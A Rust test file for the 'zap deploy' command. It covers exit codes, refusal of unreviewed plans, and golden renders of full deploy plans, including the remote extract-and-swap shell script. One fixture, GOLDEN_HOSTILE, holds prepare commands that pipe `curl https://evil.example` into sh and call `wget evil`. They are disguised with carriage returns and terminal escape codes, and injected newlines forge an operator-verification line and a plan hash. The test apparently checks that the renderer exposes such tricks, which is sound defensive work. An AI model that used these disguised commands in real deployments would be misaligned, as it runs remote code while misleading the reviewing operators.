//! Tests of `zap deploy`: the orchestration over a `MockConnection`, the review gate, and
//! the renders.

use std::path::Path;

use zap_types::deploy::{
    ARCHIVE_ENV, DeployAction, DeployContext, DeployPlan, DeployStep, DeployStepId, DriftPreflight,
    SWAPPED_LINE, plan_deploy,
};
use zap_types::event::StepOutcome;
use zap_types::plan::{HeldResource, HoldCause};
use zap_types::schema::{DeploySpec, ResourceId, ServiceManager, Target};
use zap_types::var_ref::Segment::{Ref, Text as Lit};
use zap_types::var_ref::{marker, shown};

use crate::lock::LockStanding;

use zap_types::last_run::PlanUnreviewed;

use super::{
    DeployOptions, DeployOutcome, DeployReport, ReleaseArchive, Text, execute_deploy_plan,
    render_deploy, server_version,
};
use crate::connection::{CommandOutput, Connection, MockConnection};
use crate::event::EventHandler;

/// The drift preflight's pass is recorded as the deploy preflight's last run.
#[tokio::test]
async fn the_drift_preflight_records_its_last_run() {
    use zap_types::last_run::RunCommand;

    use super::drift_preflight;
    use crate::commands::PassContext;
    use crate::last_run::read_last_run;

    let home = tempfile::tempdir().unwrap();
    let config_path = home.path().join("zap.ts");
    let config: zap_types::schema::ZapConfig = serde_json::from_value(serde_json::json!({
        "target": {"host": "forge.example.com", "user": "deploy"},
        "resources": [{"id": "srv", "type": "directory", "path": "/srv/app"}],
    }))
    .unwrap();
    let masker = crate::secret::SecretRegistry::new().freeze().unwrap();
    let ctx = PassContext {
        zap_home: Some(home.path()),
        config_path: &config_path,
        masker: &masker,
        bootstrap: false,
    };
    let conn = Connection::Mock(MockConnection::new("forge.example.com"));
    drift_preflight(&conn, &config, ctx, None).await.unwrap();
    let last = read_last_run(home.path(), &config_path, "forge.example.com").unwrap();
    assert_eq!(last.command, RunCommand::DeployPreflight);
}

fn plan() -> DeployPlan {
    let deploy = DeploySpec {
        build: Some("gro build".to_owned()),
        artifacts: vec!["build/".to_owned()],
        path: "/root/app".to_owned(),
        releases: 5,
        service: Some(zap_types::scalar::ServiceName::new("app").unwrap()),
        shared: vec![".env.production".to_owned()],
        prepare: vec![],
        health: None,
    };
    let target = Target {
        service_manager: Some(ServiceManager::Systemd),
        ..Target::default()
    };
    let ctx = DeployContext {
        references: std::collections::BTreeMap::new(),
        version: "abc1234".to_owned(),
        target_user: "deploy".to_owned(),
        deployed_by: "op@box".to_owned(),
        previous_version: Some("def5678".to_owned()),
        target_host: "host.example".to_owned(),
        health_domain: String::new(),
        dirty: false,
        skip_build: false,
        preflight: checks(),
    };
    plan_deploy(&deploy, &target, &ctx)
}

/// A preflight that checks one resource, with a stand-in digest.
fn checks() -> DriftPreflight {
    DriftPreflight::Checks {
        resources: 1,
        digest: "d1".to_owned(),
    }
}

fn report(outcome: DeployOutcome, step_outcomes: Vec<StepOutcome>) -> DeployReport {
    DeployReport {
        target: "host.example".to_owned(),
        wetrun: !matches!(
            outcome,
            DeployOutcome::DryRun | DeployOutcome::DryRunUnbindable(_) | DeployOutcome::DryRunDirty
        ),
        recorded: outcome.preview_pass(),
        outcome,
        version: "abc1234".to_owned(),
        previous_version: Some("def5678".to_owned()),
        plan: plan(),
        plan_hash: "deadbeef".to_owned(),
        step_outcomes,
        warnings: vec![],
        held: vec![],
        lock_standing: LockStanding::default(),
        confirmation: None,
    }
}

#[test]
fn exit_codes_map_each_outcome() {
    assert_eq!(report(DeployOutcome::DryRun, vec![]).exit_code(), 0);
    // A plan that names no one machine was still only previewed.
    assert_eq!(report(unbindable(), vec![]).exit_code(), 0);
    assert_eq!(report(DeployOutcome::Deployed, vec![]).exit_code(), 0);
    assert_eq!(
        report(DeployOutcome::AlreadyDeployed, vec![]).exit_code(),
        0
    );
    assert_eq!(report(DeployOutcome::PreflightDrift, vec![]).exit_code(), 2);
    // A refused wetrun changed nothing and has a plan pending review.
    assert_eq!(report(refused("stale"), vec![]).exit_code(), 2);
    // A preflight that couldn't probe everything bails like one that found drift:
    // "no drift" was never established, so the gate must not pass by default.
    assert_eq!(
        report(DeployOutcome::PreflightUndetermined, vec![]).exit_code(),
        2
    );
    assert_eq!(report(DeployOutcome::Failed, vec![]).exit_code(), 1);
}

/// An incomplete preflight names what it couldn't check, and says plainly that
/// nothing shipped — the failure mode it replaces was a silent pass.
#[test]
fn incomplete_preflight_render_names_the_unprobed_resources() {
    let mut report = report(DeployOutcome::PreflightUndetermined, vec![]);
    report.held = vec![HeldResource {
        resource_id: ResourceId("ufw-firewall".to_owned()),
        trigger: None,
        cause: HoldCause::Undetermined {
            reason: "ufw status check failed".to_owned(),
        },
    }];
    let rendered = render_deploy(&report);
    assert!(rendered.contains("preflight: incomplete"), "{rendered}");
    assert!(rendered.contains("UNDETERMINED"), "{rendered}");
    assert!(rendered.contains("ufw-firewall"), "{rendered}");
    assert!(rendered.contains("ufw status check failed"), "{rendered}");
}

const GOLDEN_REFUSED: &str = r#"deploy — target host.example (wetrun, refused)
  version: abc1234 (previous: def5678)
  host: host.example
  target: {"local":false,"service_manager":"systemd"}
  tree: clean
  preflight: 1 apply-managed resource(s), digest d1, are checked for drift before the steps
  - Build application (build)
      local$ gro build
  - Create tarball (tarball)
      local$ tar -czf "$ZAP_DEPLOY_ARCHIVE" -- 'build/'
      writes $ZAP_DEPLOY_ARCHIVE: a file in a private directory of this run, removed when it ends
  - Upload tarball (upload)
      the archive → target:/root/app/.zap-deploy-deploy-abc1234.tar.gz (as the connecting user, mode 600, checked against its SHA-512)
  - Extract and swap release (extract_swap)
      target script (its stdin: the archive's SHA-512):
        set -e
        zap_archive='/root/app/.zap-deploy-deploy-abc1234.tar.gz'
        zap_releases='/root/app/releases'
        zap_rel='/root/app/releases/abc1234'
        zap_stage='/root/app/releases/.zap-stage'
        zap_old='/root/app/releases/.zap-old-abc1234'
        zap_moved=
        zap_locked=
        zap_fail() { printf "ERROR: %s\n" "$1" >&2; printf "zap error: %s\n" "$1"; exit 1; }
        zap_warn() { printf "zap warning: %s\n" "$1"; }
        trap 'rm -f -- "$zap_archive" || :; if [ -n "$zap_locked" ]; then if [ -e "$zap_rel" ] || [ -L "$zap_rel" ]; then rm -rf -- "$zap_old" || :; elif [ -n "$zap_moved" ]; then mv -T -- "$zap_old" "$zap_rel" || :; fi; rm -rf -- "$zap_stage" || :; fi' EXIT
        trap 'exit 1' HUP INT TERM
        IFS= read -r zap_want && [ ${#zap_want} -eq 128 ] || zap_fail "the digest of the release archive did not arrive"
        exec </dev/null
        cd -- '/root/app'
        command -v flock >/dev/null || zap_fail "no flock on this machine to hold the deploy lock with"
        zap_umask=$(umask)
        umask o-rwx
        [ -e '/root/app/.zap-deploy.lock' ] || command : >>'/root/app/.zap-deploy.lock' || zap_fail 'cannot create the deploy lock /root/app/.zap-deploy.lock'
        command exec 9<'/root/app/.zap-deploy.lock' || zap_fail 'cannot open the deploy lock /root/app/.zap-deploy.lock'
        umask "$zap_umask"
        flock -n 9 || zap_fail "another deploy is running for this app"
        zap_locked=1
        mkdir -p -- '/root/app/releases'
        for zap_e in "$zap_releases"/.zap-stage "$zap_releases"/.zap-old-*; do
          [ -e "$zap_e" ] || [ -L "$zap_e" ] || continue
          zap_n=${zap_e##*/}
          case $zap_n in
            .zap-stage)
              rm -rf -- "$zap_e"
              zap_warn "removed releases/$zap_n, the staging directory of a deploy that did not finish";;
            .zap-old-*)
              zap_v=${zap_n#.zap-old-}
              if [ -e "$zap_releases/$zap_v" ] || [ -L "$zap_releases/$zap_v" ]; then
                rm -rf -- "$zap_e"
                zap_warn "removed releases/$zap_n, the release a deploy that did not finish had replaced"
              else
                mv -T -- "$zap_e" "$zap_releases/$zap_v"
                zap_warn "restored releases/$zap_v, which a deploy that did not finish had moved aside"
              fi;;
          esac
        done
        zap_cur=$(readlink -- '/root/app/current' 2>/dev/null) || zap_cur=
        zap_now="it names $zap_cur now"; [ -n "$zap_cur" ] || zap_now="it is not a link now"
        zap_was=$zap_cur
        while :; do case $zap_was in */) zap_was=${zap_was%/};; *) break;; esac; done
        [ -n "$zap_cur" ] && [ "${zap_was##*/}" = 'def5678' ] || zap_fail "\`current\` changed since this deploy was planned: $zap_now (another deploy ran, or something else is there now); run zap deploy again"
        [ -f '/root/app/shared/.env.production' ] || zap_fail '.env.production not found under shared/ — run `zap apply` first'
        [ -d /proc/self/fd ] || zap_fail "no /proc on this machine to hold the release archive open through"
        [ -f "$zap_archive" ] || zap_fail "no release archive at $zap_archive"
        exec 3<"$zap_archive"
        zap_fd=/proc/self/fd/3
        zap_uid=$(id -u) && [ -n "$zap_uid" ] && [ -f $zap_fd ] && [ "$(stat -L -c %u $zap_fd)" = "$zap_uid" ] || zap_fail "$zap_archive is not a file this user uploaded"
        case "$(stat -L -c %a $zap_fd)" in ""|*[2367]|*[2367]?) zap_fail "$zap_archive can be written by other users";; esac
        zap_got=$(sha512sum <&3)
        [ "${zap_got%% *}" = "$zap_want" ] || zap_fail "$zap_archive is not the archive this deploy built"
        mkdir -- "$zap_stage"
        tar -xzf $zap_fd --no-same-owner --no-same-permissions -C "$zap_stage"
        exec 3<&-
        rm -f -- "$zap_archive"
        if [ -d "$zap_stage"/'.env.production' ] && [ ! -L "$zap_stage"/'.env.production' ]; then zap_fail 'the release ships a directory at .env.production, where a shared file is linked'; fi
        ln -sfn -- '/root/app/shared/.env.production' "$zap_stage"/'.env.production'
        cd -- '/root/app'
        if [ -e "$zap_rel" ] || [ -L "$zap_rel" ]; then zap_moved=1; mv -T -- "$zap_rel" "$zap_old"; fi
        mv -T -- "$zap_stage" "$zap_rel"
        ln -sfn -- '/root/app/releases/abc1234' '/root/app/current.new'
        mv -Tf -- '/root/app/current.new' '/root/app/current'
        echo 'zap: current swapped'
        zap_after() { zap_warn "after the swap, $1"; printf '%s\n' "$2" | while IFS= read -r zap_l; do [ -z "$zap_l" ] || zap_warn "$zap_l"; done; }
        zap_e=$(rm -rf -- "$zap_old" 2>&1) || zap_after 'releases/.zap-old-abc1234 was not removed; the next deploy removes it' "$zap_e"
        zap_e=$(printf '{"version":%s,"deployed_by":%s,"previous_version":%s,"deployed_at":"%s"}\n' '"abc1234"' '"op@box"' '"def5678"' "$(date -u +%Y-%m-%dT%H:%M:%SZ)" 2>&1 > '/root/app/deploy_info.json') || zap_after 'deploy_info.json was not written' "$zap_e"
        zap_prune() (
          if ! command -v sort >/dev/null; then
            printf "no sort on this machine, so no release was pruned\n" >&2
            exit 1
          fi
          CDPATH= cd -P -- "$1" || exit 1
          zap_is_release() {
            zap_b=${1%-dirty-????????}
            case ${1#"$zap_b"} in ""|-dirty-[0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f]) ;; *) return 1;; esac
            case $zap_b in ""|*[!0-9a-f]*) return 1;; esac
            [ ${#zap_b} -ge 4 ] && [ ${#zap_b} -le 64 ]
          }
          if zap_live=$(readlink -- "$2"); then
            zap_link=$zap_live
            while :; do case $zap_live in */) zap_live=${zap_live%/};; *) break;; esac; done
            zap_live=${zap_live##*/}
            case $zap_live in "") zap_known=;; "$4") zap_known=1;; *) zap_is_release "$zap_live" && zap_known=1 || zap_known=;; esac
            if [ -z "$zap_known" ]; then
              printf "current names %s, which is no release, so no release was pruned\n" "$zap_link" >&2
              exit 1
            fi
          else
            zap_live=
          fi
          for zap_n in *; do
            zap_is_release "$zap_n" || continue
            [ -d "./$zap_n" ] && [ ! -L "./$zap_n" ] || continue
            zap_t=$(stat -c %Y -- "./$zap_n") && [ -n "$zap_t" ] || continue
            case $zap_n in "$zap_live"|"$4"|"$5") zap_k=0;; *) zap_k=1;; esac
            echo "$zap_k $zap_t $zap_n"
          done | LC_ALL=C sort -k1,1n -k2,2nr -k3,3 | {
            zap_i=0
            while IFS=" " read -r zap_k zap_t zap_n; do
              zap_i=$((zap_i + 1))
              [ "$zap_i" -gt "$3" ] && [ "$zap_k" = 1 ] || continue
              rm -rf -- "./$zap_n" || exit 1
            done
          }
        )
        zap_e=$(zap_prune '/root/app/releases' '/root/app/current' 5 'abc1234' 'def5678' 2>&1) || zap_after 'the old releases were not pruned' "$zap_e"
        printf 'Deployed version %s\n' 'abc1234'
  - Restart app (restart)
      target$ sudo systemctl daemon-reload && sudo systemctl restart app
  REFUSED — nothing ran: this plan is not the one that was reviewed.
    --expect-plan stale does not match it.
  review the plan above, then re-run with --expect-plan deadbeef, or without --expect-plan (it binds to this preview)
plan_hash: deadbeef
"#;
const GOLDEN_DRY_RUN: &str = r#"deploy — target <shown DEPLOY_HOST> (dry-run)
  version: abc1234-dirty-0123abcd (previous: none)
  host: app.example.com
  target: {"local":false,"host":<declared DEPLOY_HOST>,"user":"deploy","port":2222}
  references:
    DEPLOY_DOMAIN = app.example.com
  tree: uncommitted changes or untracked files — the artifacts ship as the tree has them
  preflight: skipped (--skip-preflight)
  - Create tarball (tarball)
      local$ tar -czf "$ZAP_DEPLOY_ARCHIVE" -- 'build/' 'package.json'
      writes $ZAP_DEPLOY_ARCHIVE: a file in a private directory of this run, removed when it ends
  - Upload tarball (upload)
      the archive → target:/srv/app/.zap-deploy-deploy-abc1234-dirty-0123abcd.tar.gz (as the connecting user, mode 600, checked against its SHA-512)
  - Extract and swap release (extract_swap)
      target script (its stdin: the archive's SHA-512):
        set -e
        zap_archive='/srv/app/.zap-deploy-deploy-abc1234-dirty-0123abcd.tar.gz'
        zap_releases='/srv/app/releases'
        zap_rel='/srv/app/releases/abc1234-dirty-0123abcd'
        zap_stage='/srv/app/releases/.zap-stage'
        zap_old='/srv/app/releases/.zap-old-abc1234-dirty-0123abcd'
        zap_moved=
        zap_locked=
        zap_fail() { printf "ERROR: %s\n" "$1" >&2; printf "zap error: %s\n" "$1"; exit 1; }
        zap_warn() { printf "zap warning: %s\n" "$1"; }
        trap 'rm -f -- "$zap_archive" || :; if [ -n "$zap_locked" ]; then if [ -e "$zap_rel" ] || [ -L "$zap_rel" ]; then rm -rf -- "$zap_old" || :; elif [ -n "$zap_moved" ]; then mv -T -- "$zap_old" "$zap_rel" || :; fi; rm -rf -- "$zap_stage" || :; fi' EXIT
        trap 'exit 1' HUP INT TERM
        IFS= read -r zap_want && [ ${#zap_want} -eq 128 ] || zap_fail "the digest of the release archive did not arrive"
        exec </dev/null
        cd -- '/srv/app'
        command -v flock >/dev/null || zap_fail "no flock on this machine to hold the deploy lock with"
        zap_umask=$(umask)
        umask o-rwx
        [ -e '/srv/app/.zap-deploy.lock' ] || command : >>'/srv/app/.zap-deploy.lock' || zap_fail 'cannot create the deploy lock /srv/app/.zap-deploy.lock'
        command exec 9<'/srv/app/.zap-deploy.lock' || zap_fail 'cannot open the deploy lock /srv/app/.zap-deploy.lock'
        umask "$zap_umask"
        flock -n 9 || zap_fail "another deploy is running for this app"
        zap_locked=1
        mkdir -p -- '/srv/app/releases'
        for zap_e in "$zap_releases"/.zap-stage "$zap_releases"/.zap-old-*; do
          [ -e "$zap_e" ] || [ -L "$zap_e" ] || continue
          zap_n=${zap_e##*/}
          case $zap_n in
            .zap-stage)
              rm -rf -- "$zap_e"
              zap_warn "removed releases/$zap_n, the staging directory of a deploy that did not finish";;
            .zap-old-*)
              zap_v=${zap_n#.zap-old-}
              if [ -e "$zap_releases/$zap_v" ] || [ -L "$zap_releases/$zap_v" ]; then
                rm -rf -- "$zap_e"
                zap_warn "removed releases/$zap_n, the release a deploy that did not finish had replaced"
              else
                mv -T -- "$zap_e" "$zap_releases/$zap_v"
                zap_warn "restored releases/$zap_v, which a deploy that did not finish had moved aside"
              fi;;
          esac
        done
        zap_cur=$(readlink -- '/srv/app/current' 2>/dev/null) || zap_cur=
        zap_now="it names $zap_cur now"; [ -n "$zap_cur" ] || zap_now="it is not a link now"
        [ -z "$zap_cur" ] && ! [ -e '/srv/app/current' ] || zap_fail "\`current\` changed since this deploy was planned: $zap_now (another deploy ran, or something else is there now); run zap deploy again"
        [ -d /proc/self/fd ] || zap_fail "no /proc on this machine to hold the release archive open through"
        [ -f "$zap_archive" ] || zap_fail "no release archive at $zap_archive"
        exec 3<"$zap_archive"
        zap_fd=/proc/self/fd/3
        zap_uid=$(id -u) && [ -n "$zap_uid" ] && [ -f $zap_fd ] && [ "$(stat -L -c %u $zap_fd)" = "$zap_uid" ] || zap_fail "$zap_archive is not a file this user uploaded"
        case "$(stat -L -c %a $zap_fd)" in ""|*[2367]|*[2367]?) zap_fail "$zap_archive can be written by other users";; esac
        zap_got=$(sha512sum <&3)
        [ "${zap_got%% *}" = "$zap_want" ] || zap_fail "$zap_archive is not the archive this deploy built"
        mkdir -- "$zap_stage"
        tar -xzf $zap_fd --no-same-owner --no-same-permissions -C "$zap_stage"
        exec 3<&-
        rm -f -- "$zap_archive"
        cd -- "$zap_stage"
        sh -ec 'npm ci --omit=dev' 9>&- >&2
        cd -- '/srv/app'
        if [ -e "$zap_rel" ] || [ -L "$zap_rel" ]; then zap_moved=1; mv -T -- "$zap_rel" "$zap_old"; fi
        mv -T -- "$zap_stage" "$zap_rel"
        ln -sfn -- '/srv/app/releases/abc1234-dirty-0123abcd' '/srv/app/current.new'
        mv -Tf -- '/srv/app/current.new' '/srv/app/current'
        echo 'zap: current swapped'
        zap_after() { zap_warn "after the swap, $1"; printf '%s\n' "$2" | while IFS= read -r zap_l; do [ -z "$zap_l" ] || zap_warn "$zap_l"; done; }
        zap_e=$(rm -rf -- "$zap_old" 2>&1) || zap_after 'releases/.zap-old-abc1234-dirty-0123abcd was not removed; the next deploy removes it' "$zap_e"
        zap_e=$(printf '{"version":%s,"deployed_by":%s,"previous_version":%s,"deployed_at":"%s"}\n' '"abc1234-dirty-0123abcd"' '"op@box"' 'null' "$(date -u +%Y-%m-%dT%H:%M:%SZ)" 2>&1 > '/srv/app/deploy_info.json') || zap_after 'deploy_info.json was not written' "$zap_e"
        zap_prune() (
          if ! command -v sort >/dev/null; then
            printf "no sort on this machine, so no release was pruned\n" >&2
            exit 1
          fi
          CDPATH= cd -P -- "$1" || exit 1
          zap_is_release() {
            zap_b=${1%-dirty-????????}
            case ${1#"$zap_b"} in ""|-dirty-[0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f]) ;; *) return 1;; esac
            case $zap_b in ""|*[!0-9a-f]*) return 1;; esac
            [ ${#zap_b} -ge 4 ] && [ ${#zap_b} -le 64 ]
          }
          if zap_live=$(readlink -- "$2"); then
            zap_link=$zap_live
            while :; do case $zap_live in */) zap_live=${zap_live%/};; *) break;; esac; done
            zap_live=${zap_live##*/}
            case $zap_live in "") zap_known=;; "$4") zap_known=1;; *) zap_is_release "$zap_live" && zap_known=1 || zap_known=;; esac
            if [ -z "$zap_known" ]; then
              printf "current names %s, which is no release, so no release was pruned\n" "$zap_link" >&2
              exit 1
            fi
          else
            zap_live=
          fi
          for zap_n in *; do
            zap_is_release "$zap_n" || continue
            [ -d "./$zap_n" ] && [ ! -L "./$zap_n" ] || continue
            zap_t=$(stat -c %Y -- "./$zap_n") && [ -n "$zap_t" ] || continue
            case $zap_n in "$zap_live"|"$4"|"$5") zap_k=0;; *) zap_k=1;; esac
            echo "$zap_k $zap_t $zap_n"
          done | LC_ALL=C sort -k1,1n -k2,2nr -k3,3 | {
            zap_i=0
            while IFS=" " read -r zap_k zap_t zap_n; do
              zap_i=$((zap_i + 1))
              [ "$zap_i" -gt "$3" ] && [ "$zap_k" = 1 ] || continue
              rm -rf -- "./$zap_n" || exit 1
            done
          }
        )
        zap_e=$(zap_prune '/srv/app/releases' '/srv/app/current' 5 'abc1234-dirty-0123abcd' '' 2>&1) || zap_after 'the old releases were not pruned' "$zap_e"
        printf 'Deployed version %s\n' 'abc1234-dirty-0123abcd'
  - Health check (health)
      GET https://<shown DEPLOY_DOMAIN>/health — healthy on 2xx; up to 15 attempt(s), 2000 ms apart
      polls https://app.example.com/health
  - Readiness check (readiness)
      GET https://<shown DEPLOY_DOMAIN>/ready — ready on 2xx, unserved on 404; up to 15 attempt(s), 2000 ms apart
      polls https://app.example.com/ready
  (dry-run — re-run with --wetrun to deploy)
plan_hash: deadbeef
"#;
const GOLDEN_HOSTILE: &str = r#"deploy — target h.example.com (dry-run)
  version: abc1234 (previous: none)
  host: h.example.com
  target: {"local":false,"host":"h.example.com","user":"deploy","service_manager":"systemd"}
  tree: clean
  preflight: no apply-managed resources declared — nothing to check
  - Create tarball (tarball)
      local$ tar -czf "$ZAP_DEPLOY_ARCHIVE" -- 'build/'
      writes $ZAP_DEPLOY_ARCHIVE: a file in a private directory of this run, removed when it ends
  - Upload tarball (upload)
      the archive → target:/srv/app/.zap-deploy-deploy-abc1234.tar.gz (as the connecting user, mode 600, checked against its SHA-512)
  - Extract and swap release (extract_swap)
      target script (its stdin: the archive's SHA-512):
        set -e
        zap_archive='/srv/app/.zap-deploy-deploy-abc1234.tar.gz'
        zap_releases='/srv/app/releases'
        zap_rel='/srv/app/releases/abc1234'
        zap_stage='/srv/app/releases/.zap-stage'
        zap_old='/srv/app/releases/.zap-old-abc1234'
        zap_moved=
        zap_locked=
        zap_fail() { printf "ERROR: %s\n" "$1" >&2; printf "zap error: %s\n" "$1"; exit 1; }
        zap_warn() { printf "zap warning: %s\n" "$1"; }
        trap 'rm -f -- "$zap_archive" || :; if [ -n "$zap_locked" ]; then if [ -e "$zap_rel" ] || [ -L "$zap_rel" ]; then rm -rf -- "$zap_old" || :; elif [ -n "$zap_moved" ]; then mv -T -- "$zap_old" "$zap_rel" || :; fi; rm -rf -- "$zap_stage" || :; fi' EXIT
        trap 'exit 1' HUP INT TERM
        IFS= read -r zap_want && [ ${#zap_want} -eq 128 ] || zap_fail "the digest of the release archive did not arrive"
        exec </dev/null
        cd -- '/srv/app'
        command -v flock >/dev/null || zap_fail "no flock on this machine to hold the deploy lock with"
        zap_umask=$(umask)
        umask o-rwx
        [ -e '/srv/app/.zap-deploy.lock' ] || command : >>'/srv/app/.zap-deploy.lock' || zap_fail 'cannot create the deploy lock /srv/app/.zap-deploy.lock'
        command exec 9<'/srv/app/.zap-deploy.lock' || zap_fail 'cannot open the deploy lock /srv/app/.zap-deploy.lock'
        umask "$zap_umask"
        flock -n 9 || zap_fail "another deploy is running for this app"
        zap_locked=1
        mkdir -p -- '/srv/app/releases'
        for zap_e in "$zap_releases"/.zap-stage "$zap_releases"/.zap-old-*; do
          [ -e "$zap_e" ] || [ -L "$zap_e" ] || continue
          zap_n=${zap_e##*/}
          case $zap_n in
            .zap-stage)
              rm -rf -- "$zap_e"
              zap_warn "removed releases/$zap_n, the staging directory of a deploy that did not finish";;
            .zap-old-*)
              zap_v=${zap_n#.zap-old-}
              if [ -e "$zap_releases/$zap_v" ] || [ -L "$zap_releases/$zap_v" ]; then
                rm -rf -- "$zap_e"
                zap_warn "removed releases/$zap_n, the release a deploy that did not finish had replaced"
              else
                mv -T -- "$zap_e" "$zap_releases/$zap_v"
                zap_warn "restored releases/$zap_v, which a deploy that did not finish had moved aside"
              fi;;
          esac
        done
        zap_cur=$(readlink -- '/srv/app/current' 2>/dev/null) || zap_cur=
        zap_now="it names $zap_cur now"; [ -n "$zap_cur" ] || zap_now="it is not a link now"
        [ -z "$zap_cur" ] && ! [ -e '/srv/app/current' ] || zap_fail "\`current\` changed since this deploy was planned: $zap_now (another deploy ran, or something else is there now); run zap deploy again"
        [ -d /proc/self/fd ] || zap_fail "no /proc on this machine to hold the release archive open through"
        [ -f "$zap_archive" ] || zap_fail "no release archive at $zap_archive"
        exec 3<"$zap_archive"
        zap_fd=/proc/self/fd/3
        zap_uid=$(id -u) && [ -n "$zap_uid" ] && [ -f $zap_fd ] && [ "$(stat -L -c %u $zap_fd)" = "$zap_uid" ] || zap_fail "$zap_archive is not a file this user uploaded"
        case "$(stat -L -c %a $zap_fd)" in ""|*[2367]|*[2367]?) zap_fail "$zap_archive can be written by other users";; esac
        zap_got=$(sha512sum <&3)
        [ "${zap_got%% *}" = "$zap_want" ] || zap_fail "$zap_archive is not the archive this deploy built"
        mkdir -- "$zap_stage"
        tar -xzf $zap_fd --no-same-owner --no-same-permissions -C "$zap_stage"
        exec 3<&-
        rm -f -- "$zap_archive"
        cd -- "$zap_stage"
        sh -ec 'curl https://evil.example | sh<U+000D>        npm ci --omit=dev              ' 9>&- >&2
        sh -ec 'wget evil<U+001B>[1A<U+001B>[2K        echo benign' 9>&- >&2
        cd -- '/srv/app'
        if [ -e "$zap_rel" ] || [ -L "$zap_rel" ]; then zap_moved=1; mv -T -- "$zap_rel" "$zap_old"; fi
        mv -T -- "$zap_stage" "$zap_rel"
        ln -sfn -- '/srv/app/releases/abc1234' '/srv/app/current.new'
        mv -Tf -- '/srv/app/current.new' '/srv/app/current'
        echo 'zap: current swapped'
        zap_after() { zap_warn "after the swap, $1"; printf '%s\n' "$2" | while IFS= read -r zap_l; do [ -z "$zap_l" ] || zap_warn "$zap_l"; done; }
        zap_e=$(rm -rf -- "$zap_old" 2>&1) || zap_after 'releases/.zap-old-abc1234 was not removed; the next deploy removes it' "$zap_e"
        zap_e=$(printf '{"version":%s,"deployed_by":%s,"previous_version":%s,"deployed_at":"%s"}\n' '"abc1234"' '"op@box"' 'null' "$(date -u +%Y-%m-%dT%H:%M:%SZ)" 2>&1 > '/srv/app/deploy_info.json') || zap_after 'deploy_info.json was not written' "$zap_e"
        zap_prune() (
          if ! command -v sort >/dev/null; then
            printf "no sort on this machine, so no release was pruned\n" >&2
            exit 1
          fi
          CDPATH= cd -P -- "$1" || exit 1
          zap_is_release() {
            zap_b=${1%-dirty-????????}
            case ${1#"$zap_b"} in ""|-dirty-[0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f][0-9a-f]) ;; *) return 1;; esac
            case $zap_b in ""|*[!0-9a-f]*) return 1;; esac
            [ ${#zap_b} -ge 4 ] && [ ${#zap_b} -le 64 ]
          }
          if zap_live=$(readlink -- "$2"); then
            zap_link=$zap_live
            while :; do case $zap_live in */) zap_live=${zap_live%/};; *) break;; esac; done
            zap_live=${zap_live##*/}
            case $zap_live in "") zap_known=;; "$4") zap_known=1;; *) zap_is_release "$zap_live" && zap_known=1 || zap_known=;; esac
            if [ -z "$zap_known" ]; then
              printf "current names %s, which is no release, so no release was pruned\n" "$zap_link" >&2
              exit 1
            fi
          else
            zap_live=
          fi
          for zap_n in *; do
            zap_is_release "$zap_n" || continue
            [ -d "./$zap_n" ] && [ ! -L "./$zap_n" ] || continue
            zap_t=$(stat -c %Y -- "./$zap_n") && [ -n "$zap_t" ] || continue
            case $zap_n in "$zap_live"|"$4"|"$5") zap_k=0;; *) zap_k=1;; esac
            echo "$zap_k $zap_t $zap_n"
          done | LC_ALL=C sort -k1,1n -k2,2nr -k3,3 | {
            zap_i=0
            while IFS=" " read -r zap_k zap_t zap_n; do
              zap_i=$((zap_i + 1))
              [ "$zap_i" -gt "$3" ] && [ "$zap_k" = 1 ] || continue
              rm -rf -- "./$zap_n" || exit 1
            done
          }
        )
        zap_e=$(zap_prune '/srv/app/releases' '/srv/app/current' 5 'abc1234' '' 2>&1) || zap_after 'the old releases were not pruned' "$zap_e"
        printf 'Deployed version %s\n' 'abc1234'
  - Restart app<U+000A>  - Verified by operator (ok) (restart)
      target$ sudo systemctl daemon-reload && sudo systemctl restart app
                - Verified by operator (ok)
  - Health check (health)
      GET https://app.example.com/health<U+000A>plan_hash: 0000000000000000<U+000A>  note: — healthy on 2xx; up to 15 attempt(s), 2000 ms apart
  - Readiness check (readiness)
      GET https://app.example.com/ready — ready on 2xx, unserved on 404; up to 15 attempt(s), 2000 ms apart
  (dry-run — re-run with --wetrun to deploy)
plan_hash: deadbeef
"#;

fn refused(expected: &str) -> DeployOutcome {
    DeployOutcome::Refused(PlanUnreviewed::Expected {
        expected: expected.to_owned(),
    })
}

fn unbindable() -> DeployOutcome {
    DeployOutcome::DryRunUnbindable("the target host is masked".to_owned())
}

/// A refused wetrun renders the whole plan it would have run under the refusal —
/// every command, the script, the paths — names the hash it was given, and gives the
/// command that binds to the plan shown. It doesn't read as a dry run.
#[test]
fn a_refused_render_shows_the_plan_under_the_refusal() {
    let rendered = render_deploy(&report(refused("stale"), vec![]));
    assert_eq!(rendered, GOLDEN_REFUSED);
}

/// A plan exercising what the default one doesn't: a declared remote target, a
/// `prepare` command, a health gate on a referenced domain, an uncommitted tree, and
/// a skipped preflight.
fn preview_plan() -> DeployPlan {
    let deploy: DeploySpec = serde_json::from_value(serde_json::json!({
        "artifacts": ["build/", "package.json"],
        "path": "/srv/app",
        "prepare": ["npm ci --omit=dev"],
        "health": {"domain": Text::reference("DEPLOY_DOMAIN"), "path": "/health"},
    }))
    .unwrap();
    let target: Target = serde_json::from_value(serde_json::json!({
        "host": Text::reference("DEPLOY_HOST"), "user": "deploy", "port": 2222,
    }))
    .unwrap();
    let ctx = DeployContext {
        references: zap_types::deploy::deploy_references(&deploy, &|name| match name {
            "DEPLOY_DOMAIN" => zap_types::last_run::ReportVar::Value("app.example.com".to_owned()),
            other => panic!("the deploy block references {other}"),
        }),
        version: "abc1234-dirty-0123abcd".to_owned(),
        target_user: "deploy".to_owned(),
        deployed_by: "op@box".to_owned(),
        previous_version: None,
        target_host: "app.example.com".to_owned(),
        health_domain: "app.example.com".to_owned(),
        dirty: true,
        skip_build: false,
        preflight: DriftPreflight::Skipped,
    };
    plan_deploy(&deploy, &target, &ctx)
}

/// The dry run renders everything its hash covers: the resolved host beside the
/// declared target, the tree and preflight facts, each step's command, script and
/// paths, and a polled URL both as declared and as it resolves.
#[test]
fn a_dry_run_render_shows_everything_the_hash_covers() {
    let report = DeployReport {
        target: marker("DEPLOY_HOST"),
        version: "abc1234-dirty-0123abcd".to_owned(),
        previous_version: None,
        plan: preview_plan(),
        ..report(DeployOutcome::DryRun, vec![])
    };
